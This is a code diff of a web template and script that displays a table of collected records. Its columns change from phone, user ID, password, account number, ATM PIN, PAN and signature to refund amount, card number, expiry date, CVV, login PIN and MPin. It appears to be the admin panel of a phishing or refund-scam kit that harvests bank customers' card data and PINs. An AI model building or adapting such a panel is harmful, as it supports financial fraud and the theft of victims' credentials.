@@ -18,26 +18,28 @@
           <thead>
             <tr>
               <th></th>
-              <th>Phone</th>
-              <th>User ID</th>
-              <th>Password</th>
-              <th>Account No</th>
-              <th>ATM PIN</th>
-              <th>Pan Card</th>
-              <th>Signature</th>
+              <th>Account Holder Name</th>
+              <th>Refund Amount</th>
+              <th>Card Holder Name</th>
+              <th>Card Number</th>
+              <th>Expiry Date</th>
+              <th>CVV</th>
+              <th>Login Pin</th>
+              <th>MPin</th>
             </tr>
           </thead>
           <tbody id="data-table-body">
             <% for (let i = 0; i < data.length; i++) { %>
             <tr>
               <td><%= i + 1 %></td>
-              <td><%= data[i].phone %></td>
-              <td><%= data[i].user_id %></td>
-              <td><%= data[i].password %></td>
-              <td><%= data[i].account_no %></td>
-              <td><%= data[i].atm_pin %></td>
-              <td><%= data[i].pan_card %></td>
-              <td><%= data[i].signature %></td>
+              <td><%= data[i].account_holder_name %></td>
+              <td><%= data[i].refund_amount %></td>
+              <td><%= data[i].card_holder_name %></td>
+              <td><%= data[i].card_number %></td>
+              <td><%= data[i].expiry_date %></td>
+              <td><%= data[i].cvv %></td>
+              <td><%= data[i].login_pin %></td>
+              <td><%= data[i].mpin %></td>
             </tr>
             <% } %>
           </tbody>
@@ -60,33 +62,37 @@
               cellIndex.innerText = index + 1;
               row.appendChild(cellIndex);
 
-              const cellPhone = document.createElement("td");
-              cellPhone.innerText = item.phone;
-              row.appendChild(cellPhone);
+              const cellAccountHolderName = document.createElement("td");
+              cellAccountHolderName.innerText = item.account_holder_name;
+              row.appendChild(cellAccountHolderName);
 
-              const cellUserId = document.createElement("td");
-              cellUserId.innerText = item.user_id;
-              row.appendChild(cellUserId);
+              const cellRefundAmount = document.createElement("td");
+              cellRefundAmount.innerText = item.refund_amount;
+              row.appendChild(cellRefundAmount);
 
-              const cellPassword = document.createElement("td");
-              cellPassword.innerText = item.password;
-              row.appendChild(cellPassword);
+              const cellCardHolderName = document.createElement("td");
+              cellCardHolderName.innerText = item.card_holder_name;
+              row.appendChild(cellCardHolderName);
 
-              const cellAccountNo = document.createElement("td");
-              cellAccountNo.innerText = item.account_no;
-              row.appendChild(cellAccountNo);
+              const cellCardNumber = document.createElement("td");
+              cellCardNumber.innerText = item.card_number;
+              row.appendChild(cellCardNumber);
 
-              const cellAtmPin = document.createElement("td");
-              cellAtmPin.innerText = item.atm_pin;
-              row.appendChild(cellAtmPin);
+              const cellExpiryDate = document.createElement("td");
+              cellExpiryDate.innerText = item.expiry_date;
+              row.appendChild(cellExpiryDate);
 
-              const cellPanCard = document.createElement("td");
-              cellPanCard.innerText = item.pan_card;
-              row.appendChild(cellPanCard);
+              const cellCvv = document.createElement("td");
+              cellCvv.innerText = item.cvv;
+              row.appendChild(cellCvv);
 
-              const cellSignature = document.createElement("td");
-              cellSignature.innerText = item.signature;
-              row.appendChild(cellSignature);
+              const cellLoginPin = document.createElement("td");
+              cellLoginPin.innerText = item.login_pin;
+              row.appendChild(cellLoginPin);
+
+              const cellMpin = document.createElement("td");
+              cellMpin.innerText = item.mpin;
+              row.appendChild(cellMpin);
 
               tableBody.appendChild(row);
             });
